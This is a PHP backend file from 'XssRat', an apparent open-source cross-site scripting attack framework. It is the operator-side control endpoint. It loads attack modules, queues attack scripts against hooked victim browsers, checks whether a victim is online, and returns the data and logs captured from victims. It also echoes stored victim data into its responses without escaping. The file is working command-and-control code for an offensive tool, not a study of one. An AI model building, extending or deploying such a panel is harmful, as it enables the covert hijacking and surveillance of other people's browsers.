<?php
/* 
 * Created on 2014��4��16��
 * @project XssRat
 * @author owlinrye
 * @email blackrat.sec@gmail.com
 * An easy Xss framework
 */
  error_reporting(E_ALL ^ E_NOTICE);
  header("Content-Type: application/json; charset=UTF-8");
  require_once("../Path.php");
  require_once("../sess.php");
  require_once(PHP_BASE_DIR."/db/MySQL.php");
  require_once(PHP_BASE_DIR."/entity/User.php");
  require_once(PHP_BASE_DIR."/entity/Module.php");
  require_once(PHP_BASE_DIR."/entity/AttackData.php");
  require_once(PHP_BASE_DIR."/entity/AttackLog.php");
  require_once(PHP_BASE_DIR."/entity/ModuleCategory.php");
  require_once(PHP_BASE_DIR."/entity/ProjectModuleData.php");
 
 /**
  * validate power
  */
 

 if(!isset($_SESSION['user_info']) || empty($_SESSION['user_info'])) {
	$res["reason"] = "u are not login";
 	die(json_encode($res));
 }	
 
  $data = json_decode(file_get_contents('php://input'), true);
  
   $res = array(
 		"result" => false,
 		"reason" => ""
 	);
 	
  if(empty($data)||$data===null){
 	$res["reason"] = "Data Illegal";
 	die(json_encode($res));
  }
  
  

 
 $db = new MySQL($log);	
 
 if($mysqli = $db->openDB()){
 	$user = new User($mysqli,$log);
 	$module = new Module($mysqli,$log);
 	$pmd = new ProjectModuleData($mysqli,$log);
 	$attackData = new AttackData($mysqli,$log);
 	$attackLog = new AttackLog($mysqli,$log);
 	//load attack module
 	if($data['op']==='load'){
 		if($module->getModuleByID($data['m_id'])){
 			$md = $module-> getFields();
 			$md["author"] = $user->getUserByID($md['author_id'])?$user->username:'Anonymous';
 			$res["result"] = true;
 			$res["reason"] = $md;
 		}
 	}
 	//send attack script
 	if($data['op']==='attack'){
 		// do attack 
 		if(!empty($data['pmd_id'])&&!empty($data['m_id'])){
	 		$attackData -> pmd_id = $data['pmd_id'];
			$attackData -> module_id =  $data['m_id'];
			//echo json_encode($data['config']);
			if($data['config']==null || count($data['config'])==0){
				$attackData -> module_config = "";
			}else $attackData -> module_config = json_encode($data['config']);
			
			if($attackData->newAttackData()) {
 				$res["result"] = true;
 				$res["reason"] = "Attack Sended!";
 			}else{
 				$res["result"] = false;
 				$res["reason"] = "Failed Add Attack Data!";
 			}
 			
 		}else{
 			 	$res["result"] = false;
 				$res["reason"] = "Wrang Target  or Wrang Attack Module!";
 		}


 	}
 	//check client status
 	if($data['op']==='checkOnline'){
 		if($pmd->getPmdByID($data['pmd_id'])){
 			 if(strtotime("now")-strtotime($pmd->uptime)<10){
 			 	$res["result"] = true;
 			 	$res["reason"] = "online";
 			 }else{
 			 	$res["result"] = true;
 			 	$res["reason"] = "outline";
 			 }
 		}
 	}
 	
 	if($data['op']==='attackData'){
 		$datas = $attackData->getDatasByPmdID($data['pmd_id']);
 		if(count($datas)>0){
 			$res["result"] = true;
 			$res["reason"] = $datas;
 		}
 	}
 	
 	if($data['op']==='attackLog'){
 		$logs = $attackLog->getLogs($data['pmd_id']);
 		 if(count($logs)>0){
 			$res["result"] = true;
 			$res["reason"] = $logs;
 		}
 	}
 	
 	if($data['op'] ==='attackResult'){
 		$d = $attackData->getDataByID($data['id']);
 		if($d){
 			$db->closeDB();
 			if(json_decode($d)){
 				die( "{\"result\":true,\"reason\":".$d."}");
 			}
 			else die( "{\"result\":true,\"reason\":\"".$d."\"}"); 
 		}
 	}
 	
 	$db->closeDB();
 }
 
 die(json_encode($res));
?>
